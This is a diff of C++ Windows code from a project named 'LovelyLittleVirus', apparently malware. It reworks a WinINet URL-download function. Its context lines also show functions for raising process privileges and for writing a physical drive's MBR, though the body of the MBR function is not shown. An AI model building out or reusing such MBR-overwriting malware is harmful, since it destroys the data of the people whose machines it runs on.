@@ -91,7 +91,7 @@ bool adjustPrivilege(ULONG privilege = 0x13) {
 	return (enabled == TRUE ? true : false);
 }
 
-inline bool GetPrivileges() { return adjustPrivilege(); }
+
 //写MBR
 bool WritePhydriveMBR(unsigned int id,const string& msgstr)
 {
@@ -238,9 +238,8 @@ bool PlaySoundData(const TCHAR* psounddata, bool sync)
 }
 
 
-/*
-//已过时
-std::wstring GetDataFromURLOld(const std::wstring& url, bool& isok)
+
+std::wstring GetWDataFromURL(const std::wstring& url, bool& isok)
 {
 	CInternetSession session;
 	CHttpFile* file = NULL;
@@ -282,23 +281,21 @@ std::wstring GetDataFromURLOld(const std::wstring& url, bool& isok)
 }
 
 
-*/
-
-// 定义函数签名
-std::string GetDataFromURL(const std::wstring& url, bool& error,const std::wstring& AppName= _T("LovelyLittleVirus")) {
+//来自ChatGPT
+std::string GetDataFromURL(const std::wstring& url, bool& is_ok,const std::wstring& AppName= _T("LovelyLittleVirus")) {
 	// 初始化错误状态
-	error = false;
+	is_ok = true;
 	// 初始化 Internet 连接
 	HINTERNET hInternet = InternetOpen(AppName.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (hInternet == NULL) {
-		error = true;
+		is_ok = false;
 		return "";
 	}
 
 	// 打开 URL
 	HINTERNET hUrl = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
 	if (hUrl == NULL) {
-		error = true;
+		is_ok = false;
 		InternetCloseHandle(hInternet);
 		return "";
 	}
@@ -307,7 +304,7 @@ std::string GetDataFromURL(const std::wstring& url, bool& error,const std::wstri
 	DWORD contentLength = 0;
 	DWORD headerLength = sizeof(DWORD);
 	if (!HttpQueryInfo(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &headerLength, NULL)) {
-		error = true;
+		is_ok = false;
 		InternetCloseHandle(hUrl);
 		InternetCloseHandle(hInternet);
 		return "";
@@ -318,7 +315,7 @@ std::string GetDataFromURL(const std::wstring& url, bool& error,const std::wstri
 	buffer.resize(contentLength);
 	DWORD bytesRead = 0;
 	if (!InternetReadFile(hUrl, &buffer[0], contentLength, &bytesRead)) {
-		error = true;
+		is_ok = false;
 		InternetCloseHandle(hUrl);
 		InternetCloseHandle(hInternet);
 		return "";
